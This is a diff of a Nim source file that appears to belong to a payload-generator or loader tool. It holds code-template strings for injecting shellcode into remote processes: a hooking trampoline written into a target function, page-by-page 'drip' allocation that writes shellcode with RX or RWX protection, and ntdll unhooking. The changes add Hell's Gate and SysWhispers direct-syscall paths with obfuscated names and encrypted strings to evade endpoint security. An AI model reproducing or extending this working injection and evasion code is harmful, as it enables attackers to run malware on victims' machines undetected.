@@ -1,7 +1,7 @@
 import strformat
 
 
-let CustomThreadEntryStub * = """
+let CustomThreadEntryStubFirst * = """
 
 type
     MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}
@@ -29,128 +29,245 @@ NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCach
 var buffers: HookTrampolineBuffers
 
 
-proc fastTrampoline*(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers = nil): bool
 
-proc fastTrampoline*(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
-    var trampoline: seq[byte]
-    if defined(amd64):
-        trampoline = @[
-            byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
-            byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
-        ]
-        var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
-        copyMem(&trampoline[2] , &tempjumpaddr, 6)
-    elif defined(i386):
-        trampoline = @[
-            byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
-            byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
-        ]
-        var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
-        copyMem(&trampoline[1] , &tempjumpaddr, 3)
-    
-    var dwSize: DWORD = DWORD(len(trampoline))
-    var dwOldProtect: DWORD = 0
-    var output: bool = false
-    
+"""
 
+let CustomThreadEntryStubSecond * = """
 
-    if (buffers != nil):
-        if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
-            echo "Previous Bytes == 0"
-            return false
-        var gotMem: BOOL = ReadProcessMemory(targetProc, addressToHook, cast[LPVOID](buffers.previousBytes), buffers.previousBytesSize, nil)
-        if (gotMem):
-            echo "Backup for previous bytes done"
-        #copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
+    proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
+        var trampoline: seq[byte]
+        if defined(amd64):
+            trampoline = @[
+                byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
+                byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
+            ]
+            var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
+            moveMemory(&trampoline[2] , &tempjumpaddr, 6)
+        elif defined(i386):
+            trampoline = @[
+                byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
+                byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
+            ]
+            var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
+            moveMemory(&trampoline[1] , &tempjumpaddr, 3)
+        
+        var dwSize: SIZE_T = cast[SIZE_T](len(trampoline))
+        var dwOldProtect: DWORD = 0
+        var output: bool = false
+        var szWritten: SIZE_T = 0
+        var sizeOfPage: SIZE_T = cast[SIZE_T](len(trampoline))
+        var status: NTSTATUS
 
-    var yeah: WINBOOL = WriteProcessMemory(targetProc, addressToHook, addr trampoline[0], dwSize, nil)
-    if (yeah == 0):
-        echo "[-] WriteProcessMemory failed: ", toHex(GetLastError())
-    else:
-        echo "[+] WriteProcessMemory success"
-    #copyMem(addressToHook, addr trampoline[0], dwSize)
-    output = true
-
-    
-    var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
-    if (status == 0):
-        echo "[+] NtFlushInstructionCache success"
-    else:
-        echo "[-] NtFlushInstructionCache failed: ", toHex(status)
-    
-    #VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
-
-    return output
+        if (buffers != nil):
+            if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
+                echo "Previous Bytes == 0"
+                return false
+            var gotMem: BOOL = ReadProcessMemory(targetProc, addressToHook, cast[LPVOID](buffers.previousBytes), buffers.previousBytesSize, nil)
+            if (gotMem):
+                echo "Backup for previous bytes done"
+            #moveMemory(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
 
 
-proc prepEntry(hProc: HANDLE, jumpAddress: LPVOID, jmpModName: string, jmpFuncName: string): LPVOID =
-    
-    var lpDllExport: LPVOID
-    if (jmpModName == obf("ntdll.dll")):
+        when defined(Hellsgate):
+            if getSyscall(ntProtectTable):              
+                syscall = ntProtectTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                return false
+        
+        var protectAddress: LPVOID = addressToHook
+        when defined(SysWhispers):
+            status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE ,addr dwOldProtect)
+        else:
+            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE,addr dwOldProtect)    
 
-        var hJmpMod: HMODULE = GetModuleHandle(jmpModName)
-
-        if(hJmpMod == 0):
-            return nil 
-
-        lpDllExport = GetProcAddress(hJmpMod, jmpFuncName)
-    else:
-        var RemoteHandle = GetRemoteModuleHandle(hProc, jmpModName)
-        if RemoteHandle == 0:
+        if(status != STATUS_SUCCESS):
             when defined(verbose):
-                echo obf("[X] Failed to get "), jmpModName, obf(" handle")
-            return nil
-
-        lpDllExport = GetRemoteProcAddress(hProc, RemoteHandle, jmpFuncName)
-        if lpDllExport == NULL:
+                echo obf("[-] NtProtectVirtualMemory failed")
+        else:
             when defined(verbose):
-                echo obf("[X] Failed to get the address of "), jmpFuncName
-            return nil
+                echo obf("[+] NtProtectVirtualMemory succeeded")
 
-    buffers.previousBytes = cast[HANDLE](lpDllExport)
-    buffers.previousBytesSize = DWORD(sizeof(lpDllExport))
-    when defined(verbose):
-        echo obf("[*] Hooking function: "), toHex(cast[HANDLE](lpDllExport))
-    discard fastTrampoline(hProc, lpDllExport, jumpAddress, &buffers)
+        when defined(Hellsgate):
+            if getSyscall(ntWriteTable):
+                syscall = ntWriteTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                return false
+        
+        when defined(SysWhispers):
+            status = oqiazasusjk(targetProc,addressToHook,addr trampoline[0],dwSize,addr szWritten)
+        else:
+            status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwSize,addr szWritten)
+        
+        if(status != STATUS_SUCCESS):
+            when defined(verbose):
+                echo obf("[-] NtWriteVirtualMemory failed")
+        else:
+            when defined(verbose):
+                echo obf("[+] NtWriteVirtualMemory succeeded")
+                output = true
 
-    return lpDllExport
+        when defined(Hellsgate):
+            if getSyscall(ntProtectTable):              
+                syscall = ntProtectTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                return false
+        
+        protectAddress = addressToHook
+        when defined(SysWhispers):
+            status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ ,addr dwOldProtect)
+        else:
+            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ,addr dwOldProtect)    
 
-proc restoreBytes(hProc: HANDLE, addressToHook: LPVOID): bool =
-    var dwSize: DWORD = buffers.previousBytesSize
-    var dwOldProtect: DWORD = 0
-    var output: bool = false
+        if(status != STATUS_SUCCESS):
+            when defined(verbose):
+                echo obf("[-] NtProtectVirtualMemory failed")
+        else:
+            when defined(verbose):
+                echo obf("[+] NtProtectVirtualMemory succeeded")
 
-    var yeah: WINBOOL = WriteProcessMemory(hProc, addressToHook, cast[LPCVOID](buffers.previousBytes), dwSize, nil)
-    if (yeah == 0):
-        echo "[-] WriteProcessMemory failed: ", toHex(GetLastError())
-    else:
-        echo "[+] WriteProcessMemory success"
+        #[
+        var yeah: WINBOOL = WriteProcessMemory(targetProc, addressToHook, addr trampoline[0], dwSize, nil)
+        if (yeah == 0):
+            echo "[-] WriteProcessMemory failed: ", toHex(GetLastError())
+        else:
+            echo "[+] WriteProcessMemory success"
+        #moveMemory(addressToHook, addr trampoline[0], dwSize)
         output = true
-    #copyMem(addressToHook, buffers.previousBytes, dwSize)
-    
+        ]#
+        
+        var flushstatus = NtFlushInstructionCache(-1, addressToHook, ULONG(dwSize))
+        if (flushstatus == 0):
+            echo "[+] NtFlushInstructionCache success"
+        else:
+            echo "[-] NtFlushInstructionCache failed: ", toHex(status)
+        
+        #VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
 
-    var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
-    if (status == 0):
-        echo "[+] NtFlushInstructionCache success"
-    else:
-        echo "[-] NtFlushInstructionCache failed: ", toHex(status)
-    
-    #VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
+        return output
 
-    return output
+
+    proc prepEntry(hProc: HANDLE, jumpAddress: LPVOID, jmpModName: string, jmpFuncName: string): LPVOID =
+        
+        var lpDllExport: LPVOID
+        if (jmpModName == obf("ntdll.dll")):
+
+            var hJmpMod: HMODULE = GetModuleHandle(jmpModName)
+
+            if(hJmpMod == 0):
+                return nil 
+
+            lpDllExport = GetProcAddress(hJmpMod, jmpFuncName)
+        else:
+            var RemoteHandle = GetRemoteModuleHandle(hProc, jmpModName)
+            if RemoteHandle == 0:
+                when defined(verbose):
+                    echo obf("[X] Failed to get "), jmpModName, obf(" handle")
+                return nil
+
+            lpDllExport = GetRemoteProcAddress(hProc, RemoteHandle, jmpFuncName)
+            if lpDllExport == NULL:
+                when defined(verbose):
+                    echo obf("[X] Failed to get the address of "), jmpFuncName
+                return nil
+
+        buffers.previousBytes = cast[HANDLE](lpDllExport)
+        buffers.previousBytesSize = DWORD(sizeof(lpDllExport))
+        when defined(verbose):
+            echo obf("\r\n[*] Hooking function: "), toHex(cast[HANDLE](lpDllExport))
+        discard fastTrampoline(hProc, lpDllExport, jumpAddress, &buffers)
+
+        return lpDllExport
+
+    proc restoreBytes(hProc: HANDLE, addressToHook: LPVOID): bool =
+        var dwSize: SIZE_T = cast[SIZE_T](buffers.previousBytesSize)
+        var dwOldProtect: DWORD = 0
+        var output: bool = false
+        var szWritten: SIZE_T = 0
+        var sizeOfPage: SIZE_T = cast[SIZE_T](buffers.previousBytesSize)
+        var status: NTSTATUS
+
+        when defined(Hellsgate):
+            if getSyscall(ntProtectTable):              
+                syscall = ntProtectTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                return false
+        
+        var protectAddress: LPVOID = addressToHook
+        when defined(SysWhispers):
+            status = uashdiasdj(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE ,addr dwOldProtect)
+        else:
+            status = NtProtectVirtualMemory(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE,addr dwOldProtect)    
+
+        if(status != STATUS_SUCCESS):
+            when defined(verbose):
+                echo obf("[-] NtProtectVirtualMemory failed")
+        else:
+            when defined(verbose):
+                echo obf("[+] NtProtectVirtualMemory succeeded")
+
+        when defined(Hellsgate):
+            if getSyscall(ntWriteTable):
+                syscall = ntWriteTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                return false
+        
+        when defined(SysWhispers):
+            status = oqiazasusjk(hProc,addressToHook,cast[LPCVOID](buffers.previousBytes),dwSize,addr szWritten)
+        else:
+            status = NtWriteVirtualMemory(hProc,addressToHook,cast[LPCVOID](buffers.previousBytes),dwSize,addr szWritten)
+        
+        if(status != STATUS_SUCCESS):
+            when defined(verbose):
+                echo obf("[-] NtWriteVirtualMemory failed")
+        else:
+            when defined(verbose):
+                echo obf("[+] NtWriteVirtualMemory succeeded")
+                output = true
+
+        when defined(Hellsgate):
+            if getSyscall(ntProtectTable):              
+                syscall = ntProtectTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                return false
+        
+        protectAddress = addressToHook
+        when defined(SysWhispers):
+            status = uashdiasdj(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ ,addr dwOldProtect)
+        else:
+            status = NtProtectVirtualMemory(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ,addr dwOldProtect)    
+
+        if(status != STATUS_SUCCESS):
+            when defined(verbose):
+                echo obf("[-] NtProtectVirtualMemory failed")
+        else:
+            when defined(verbose):
+                echo obf("[+] NtProtectVirtualMemory succeeded")
+
+
+        var flushstatus = NtFlushInstructionCache(-1, addressToHook, ULONG(dwSize))
+        if (flushstatus == 0):
+            echo "[+] NtFlushInstructionCache success"
+        else:
+            echo "[-] NtFlushInstructionCache failed: ", toHex(status)
+        
+
+        return output
 
 """
 
 let DripAllocateStubFirst * = """
-
-proc ANtAVM(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS
-    {.discardable, stdcall, dynlib: "ntdll", importc: "NtAllocateVirtualMemory".}
-
-proc ANtWVM(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS
-    {.discardable, stdcall, dynlib: "ntdll", importc: "NtWriteVirtualMemory".}
-
-proc ANtPVM(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS
-    {.discardable, stdcall, dynlib: "ntdll", importc: "NtProtectVirtualMemory".}
 
 const VC_PREF_BASES: seq[pointer] = @[cast[pointer](0x00000007FFFF0000),
     cast[pointer](0x00000000DDDD0000),
@@ -243,15 +360,19 @@ let DripAllocateStubSecond * = """
         for i in 1..numberOfAllocations:
             Sleep(1)
 
-            status = ANtAVM(
-                ProcessHandle,
-                addr currentVmBase,
-                0,
-                &sc_size,
-                MEM_RESERVE,
-                PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#
-            )
+            when defined(Hellsgate):
+                if getSyscall(ntAllocTable):
+                    syscall = ntAllocTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
+                
+            when defined(SysWhispers):
+                status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
+            else:
+                status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
 
+                
             if status == STATUS_SUCCESS:
                 when defined(verbose):
                     echo obf("[+] NtAllocateVirtualMemory succeeded")
@@ -287,14 +408,19 @@ let DripAllocateStubSecond * = """
                 let offset = cmm_i * sizeOfPage
                 currentVmBase = cast[LPVOID](cast[DWORD_PTR](vcVmResv[i]) + offset)
 
-                status = ANtAVM(
-                    ProcessHandle,
-                    addr currentVmBase,
-                    0,
-                    addr sizeOfPage,
-                    MEM_COMMIT,
-                    PAGE_READWRITE
-                    )
+
+                when defined(Hellsgate):
+                    if getSyscall(ntAllocTable):
+                        syscall = ntAllocTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
+                    
+                when defined(SysWhispers):
+                    status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
+                else:
+                    status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
+
                 
                 if(status != STATUS_SUCCESS):
                     when defined(verbose):
@@ -309,14 +435,20 @@ let DripAllocateStubSecond * = """
 
                 var szWritten: SIZE_T = 0
 
-                status = ANtWVM(
-                    ProcessHandle,
-                    currentVmBase,
-                    unsafeAddr scArray[offsetSc],
-                    sizeOfPage,
-                    addr szWritten
-                    )
+
+                when defined(Hellsgate):
+                    if getSyscall(ntWriteTable):
+                        syscall = ntWriteTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                        return nil
                 
+                when defined(SysWhispers):
+                    status = oqiazasusjk(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
+                else:
+                    status = NtWriteVirtualMemory(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
+              
                 if(status != STATUS_SUCCESS):
                     when defined(verbose):
                         echo obf("[-] NtWriteVirtualMemory failed")
@@ -330,14 +462,18 @@ let DripAllocateStubSecond * = """
 
                 offsetSc += DWORD(sizeOfPage)
 
-                status = ANtPVM(
-                    ProcessHandle,
-                    addr currentVmBase,
-                    addr sizeOfPage,
-                    protectionValue #[RX or RWX depending on operators choice]#,
-                    addr oldProt
-                    )
-                
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):              
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        return nil
+                when defined(SysWhispers):
+                    status = uashdiasdj(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)
+                else:
+                    status = NtProtectVirtualMemory(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)    
+
                 if(status != STATUS_SUCCESS):
                     when defined(verbose):
                         echo obf("[-] NtProtectVirtualMemory failed")
@@ -411,7 +547,7 @@ let UnhookNtdllStub * = """
                         when defined(verbose):
                             echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{status}."
                         return false
-                    status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
+                    status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten)
                     if status != 0:
                         when defined(verbose):
                             echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{status}."
@@ -444,7 +580,7 @@ let UnhookNtdllStub * = """
                             when defined(verbose):
                                 echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                             return false
-                    status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
+                    status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten)
                     if status != 0:
                         when defined(verbose):
                             echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{status}."
